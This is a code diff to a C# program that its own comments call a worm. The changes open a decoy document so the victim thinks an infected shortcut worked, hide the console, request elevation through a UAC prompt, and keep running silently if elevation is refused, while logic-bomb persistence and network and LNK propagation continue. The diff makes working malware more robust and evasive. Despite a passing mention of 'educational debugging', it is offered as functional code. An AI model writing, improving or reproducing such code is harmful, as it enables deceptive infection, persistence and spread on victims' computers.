@@ -46,18 +46,8 @@ class Program
 
     static async Task Main(string[] args)
     {
-        // 1. Hide the console window immediately
-        var handle = GetConsoleWindow();
-        ShowWindow(handle, SW_HIDE);
-
-        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
-        Directory.SetCurrentDirectory(baseDir);
-
-        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
-        string logFileName = $"Worm_log_{timestamp}.log";
-        logFilePath = Path.Combine(baseDir, logFileName);
-
-        // 2. Handle Decoy (If launched via LNK with arguments)
+        // CRITICAL FIX: Open decoy document FIRST, before anything else
+        // This ensures the user sees their document open regardless of what happens next
         if (args.Length > 0)
         {
             string targetDoc = args[0];
@@ -68,11 +58,32 @@ class Program
                     // Open the original document so the user thinks the shortcut worked
                     Process.Start(new ProcessStartInfo(targetDoc) { UseShellExecute = true });
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    // Fail silently - user won't notice, malware continues
+                    // Only log for educational debugging
+                    try
+                    {
+                        string tempLog = Path.Combine(Path.GetTempPath(), "worm_decoy_error.txt");
+                        System.IO.File.AppendAllText(tempLog, $"[{DateTime.Now}] Decoy open failed: {ex.Message}\n");
+                    }
+                    catch { /* Even logging failed - just continue */ }
+                }
             }
         }
 
-        // 3. Admin Privilege Check & Escalation
+        // Now hide the console window
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
+        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+        Directory.SetCurrentDirectory(baseDir);
+
+        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
+        string logFileName = $"Worm_log_{timestamp}.log";
+        logFilePath = Path.Combine(baseDir, logFileName);
+
+        // Admin Privilege Check & Escalation with Silent Fallback
         if (!IsAdministrator())
         {
             try
@@ -83,23 +94,29 @@ class Program
                 proc.WorkingDirectory = baseDir;
                 proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
                 proc.Verb = "runas"; // This triggers the UAC prompt
-                // We do NOT pass args here, so the admin instance knows it's the payload runner, not the LNK handler
 
                 Process.Start(proc);
 
-                // Exit this non-admin instance. The user sees the doc open, and a UAC prompt.
-                // If they click Yes, the malware runs hidden as admin.
+                // Exit this non-admin instance
+                // The elevated instance will handle the full payload
                 Environment.Exit(0);
             }
             catch
             {
-                // If user clicks "No" on UAC, we stay in this process.
-                // We proceed with "Best Effort" execution (might fail persistence/logic bomb).
-                LogWarning("UAC denied. Running with limited privileges.");
+                // User clicked "No" on UAC, or UAC failed for another reason
+                // DON'T exit, DON'T show errors to user
+                // Continue running with limited privileges (Silent Fallback - Option A)
+                // Some features will fail (scheduled tasks require admin)
+                // But network propagation and LNK infection will still work
+                LogWarning("UAC denied or failed - running with limited privileges");
+                LogWarning("Persistence (scheduled tasks) will fail, but propagation continues");
             }
         }
 
-        // 4. Run the actual Malware Payload
+        // If we reach here, either:
+        // 1. We're running as admin (original or elevated instance), OR
+        // 2. User denied UAC and we're continuing with limited privileges
+        // Either way, run the malware payload
         await RunMalwarePayload(baseDir);
     }
 
@@ -123,6 +140,7 @@ class Program
             string duplicateBombPath = CreateDuplicatePayload(baseDir);
 
             // 2. Install Persistence (Worm + Duplicated LogicBomb)
+            // This will gracefully fail if not admin
             LogInfo("[STEP 2] Attempting to install persistence...");
             InstallPersistence(duplicateBombPath);
 
@@ -150,9 +168,16 @@ class Program
 
     private static bool IsAdministrator()
     {
-        var identity = WindowsIdentity.GetCurrent();
-        var principal = new WindowsPrincipal(identity);
-        return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        try
+        {
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+        catch
+        {
+            return false;
+        }
     }
 
     // --- STEP 1: Duplicate the payload and return the path to the new EXE ---
@@ -199,6 +224,13 @@ class Program
     {
         try
         {
+            if (!IsAdministrator())
+            {
+                LogWarning("Not running as admin - skipping persistence installation");
+                LogWarning("Scheduled tasks require administrator privileges");
+                return;
+            }
+
             string wormPath = Process.GetCurrentProcess().MainModule.FileName;
             if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
             {
@@ -206,7 +238,7 @@ class Program
             }
             else
             {
-                LogWarning($"Failed to create Worm scheduled task (Likely requires Admin).");
+                LogWarning($"Failed to create Worm scheduled task.");
             }
 
             if (!string.IsNullOrEmpty(duplicateLogicBombPath) && System.IO.File.Exists(duplicateLogicBombPath))
